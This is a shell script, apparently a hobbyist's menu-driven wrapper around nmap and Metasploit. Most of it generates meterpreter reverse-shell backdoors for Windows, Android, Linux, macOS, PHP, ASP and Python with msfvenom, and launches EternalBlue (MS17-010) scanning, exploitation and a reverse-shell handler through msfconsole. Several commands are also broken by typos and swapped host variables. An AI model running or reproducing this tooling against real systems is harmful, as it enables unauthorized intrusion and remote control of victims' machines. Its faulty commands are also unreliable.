#!/bin/sh

#welcome to Nutssss tools
#by Nutssss
#email: nutssss@saodog.cn
#blog:https://blog.nutssss,cn
#版权来源于咸鱼Nutssss，简单的shell制作的msf一键启动工具～

#Nutssss
nutssss(){
echo "\033[31m\033[01m\033[05m
 _   _       _                     _____           _
| \ | |_   _| |_ ___ ___ ___ ___  |_   _|__   ___ | |___
|  \| | | | | __/ __/ __/ __/ __|   | |/ _ \ / _ \| / __|
| |\  | |_| | |_\__ \__ \__ \__ \   | | (_) | (_) | \__ \

|_| \_|\__,_|\__|___/___/___/___/   |_|\___/ \___/|_|___/
    \033[0m"
}

#nutsssstools File create
mkdir ~/nutsssstools
clear

#welcome
welcome(){
    clear
    echo "\033[33m Please enter root password :  \033[0m"
    sudo clear
    nutssss
    sleep 1
    echo "\033[31mwelcome use Nutssss Tools\033[0m"
    echo "\033[34mBlog：https://blog.nutssss.cn/\033[0m"
    sleep 3
    clear
}

#options
options(){
   nutssss
    echo "\033[37m list : \033[0m"
    echo ""
    echo "----------------------------------------------------------"
    echo "\033[31m [1]Nmap Tools. \033[0m"
    echo "\033[33m [2]Create the MSF backdoor. \033[0m"
    echo "\033[36m [3]Start msfconsole. \033[0m"
    echo "\033[35m [4]Set local IP&&port. \033[0m"
    echo "\033[39m [5]About. \033[0m"
    echo ""
    echo "\033[37m [0]Back. \033[0m"
    echo "----------------------------------------------------------"
    echo ""
    read -p "Please select : " options_numb
    case $options_numb in
    "1" )
    clear
    nmap
    ;;
    "2" )
    clear
    create_msf
    ;;
    "3" )
    start_msf
    ;;
    "4" )
    get
    ;;
    "5" )
    about
    ;;
    * )
    clear
    options;
    esac
}

#nmap
nmap(){
    nutssss
    echo ""
    echo "----------------------------------------------------------"
    echo "\033[31m [1]Scanning LAN IP . \033[0m"
    echo "\033[31m [2]Scan open port . \033[0m"
    echo "\033[31m [3]Scan target type . \033[0m"
    echo ""
    echo "\033[37m [0]Back . \033[0m"
    echo "----------------------------------------------------------"
    echo ""
    read -p "Please select : " nmap_numb #判断nmap选项
    case $nmap_numb in
    "1" )
    read -p "Please enter IP segment(192.168.0.1/24) : " nmap_lan #1.扫描局域网活动主机IP
    clear
    sudo nmap -sP $nmap_lan
    echo ""    #回车返回
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    nmap;
    esac
    ;;
    "2" )
    read -p "Please enter destination IP : " nmap_ss #2.扫描目标开放端口
    clear
    sudo nmap -sS $nmap_ss
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    nmap;
    esac
    ;;
    "3" )
    read -p "Scan target type : " nmap_type #3.扫描目标主机类型
    clear
    sudo nmap -O $nmap_type
    echo ""
    echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    nmap;
    esac
    ;;
    * )
    clear
    options;
    esac
}

#get
get(){
    clear
    nutssss
    if [ -z $myip ]
    then
    read -p "Please enter native IP : " myip
    read -p "Please enter port : " myport
    get
    else
    get2
    fi
}

get2(){
    echo "\033[36m IP with Port [OK!] \033[0m"
    echo "----------------------------------------------------------"
    echo [1]To reset.
     echo ""
    echo [0]Back options.
    echo "----------------------------------------------------------"
     echo ""
    read -p "Please select : " get_numb
    case $get_numb in
    "1" )
    clear
    nutssss
    read -p "Please enter native IP : " myip
    read -p "Please enter port : " myport
    get
    ;;
    * )
    clear
    options;
    esac
}

#create_msf
create_msf(){
    if [ -z $myip ]
    then
    get
    else
    nutssss
    fi
    echo ""
    echo "----------------------------------------------------------"
    echo "\033[31m [1]Windows. \033[0m"
    echo "\033[31m [2]Android. \033[0m"
    echo "\033[31m [3]Linux. \033[0m"
    echo "\033[31m [4]Mac. \033[0m"
    echo "\033[31m [5]PHP. \033[0m"
    echo "\033[31m [6]ASP. \033[0m"
    echo "\033[31m [7]Python. \033[0m"
    echo "\033[31m [8]C file, VS compilation. \033[0m"
    echo ""
    echo "\033[37m [0]Back. \033[0m"
    echo "----------------------------------------------------------"
    echo ""
    read -p "Please select : " create_msf_numb #判断msf选项
    clear
    echo "\033[33m Loading... ...\033[0m"
    case $create_msf_numb in
    "1" )
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f exe > ~/nutsssstools/nutssss-tools-msfvenom.exe
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.exe \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "2" )
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport R > ~/nutsssstools/nutssss-tools-msfvenom.apk
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.apk \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "3" )
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f elf > ~/nutsssstools/nutssss-tools-msfvenom.elf
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.elf \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "4" )
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$myip LPORT=$myport -f macho > ~/nutsssstools/nutssss-tools-msfvenom.macho
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.macho \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "5" )
    msfvenom -p php/meterpreter_reverse_tcp LHOST=$myip LPORT=myport -f raw > ~/nutsssstools/nutssss-tools-msfvenom.php
    echo "\033[36m [OK!] File path: ~/nutssss-tools-msfvenom.php \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "6" )
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f asp > ~/nutsssstools/nutssss-tools-msfvenom.asp
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.asp \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "7" )
    msfvenom -p python/meterpreter/reverser_tcp LHOST=$myip LPORT=$myport -f raw > ~/nutsssstools/nutssss-tools-msfvenom.py
    echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.py \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    "8" )
    msfvenom -p windows/meterpreter/reverse_http LHOST=$myip LPORT=$myport -f c
    echo "\033[36m [OK!] Copy to VS compile to exe! \033[0m"
    echo ""
     echo "---------------------------------------------------------------------------------------"
    echo ""
    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
    read -p "" enterback
    case $enterback in
    *)
    clear
    create_msf;
    esac
    ;;
    * )
    clear
    options;
    esac
}

#start_msf             #msfconsole -x "1;1;1;"
start_msf(){
    if [ -z $myip ]
    then
    get
    else
    clear
    nutssss
    fi
    echo ""
    echo "----------------------------------------------------------"
    echo "\033[33m [1]LAN scans MS17-010 loophole host.  \033[0m"
    echo "\033[33m [2]Attack MS17-010 loophole host. \033[0m"
    echo "\033[33m [3]Win TCP. \033[0m"
    #echo "\033[33m [4]. \033[0m"
    #echo "\033[33m [5]. \033[0m"
    #echo "\033[33m [6]. \033[0m"
    #echo "\033[33m [7]. \033[0m"
    echo ""
    echo "\033[37m [0]Back. \033[0m"
    echo "----------------------------------------------------------"
    echo ""
    read -p "Please select : " start_msf_numb
    case $start_msf_numb in
    "1" )
    read -p "Scan the thread : " thread
    msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010;set RHOSTS $myip;set RPORT 445;set threads $thread;run;"
    start_msf
    ;;
    "2" )
    read -p "Please enter destination IP : " itip
    msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/meterpreter/reverse_tcp;set RHOSTS $myip;set RPORT 445;set LHOST $itip;set LPORT 4444;run"
    start_msf
    ;;
    "3" )
    msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $myip;set LPROT $myport;run;"
    start_msf
    ;;
    * )
    clear
    create_msf;
    esac
}

#About
about(){
clear
sleep 1
echo "\033[34m 停一停，停一停，容我说几句： \033[0m"
sleep 1
echo "\033[36m 本工具由Nutssss突发奇想制作，用时一天 \033[0m"
sleep 1
echo "\033[36m 灵感来源于ezploit，做一个自己的ezploit！ \033[0m"
sleep 1
echo "\033[36m 本工具基于shell制作，初学者简单制作 \033[0m"
sleep 1
echo "\033[36m 快速的使用msf于nmap等，持续更新，敬请期待！ \033[0m"
sleep 1
echo "\033[31m email : nutssss.saodog.cn \033[0m"
sleep 1
echo "\033[31m Blog : https://blog.nutssss.cn \033[0m"
sleep 1
echo "\033[31m\033[01m\033[05m--------------------------------------------------------------\033[0m"
echo ""
echo ""
echo ""
read -p "回车返回主界面(Enter back)" enterback
case $enterback in
*)
clear
options;
esac
}

#start script
    welcome
    options
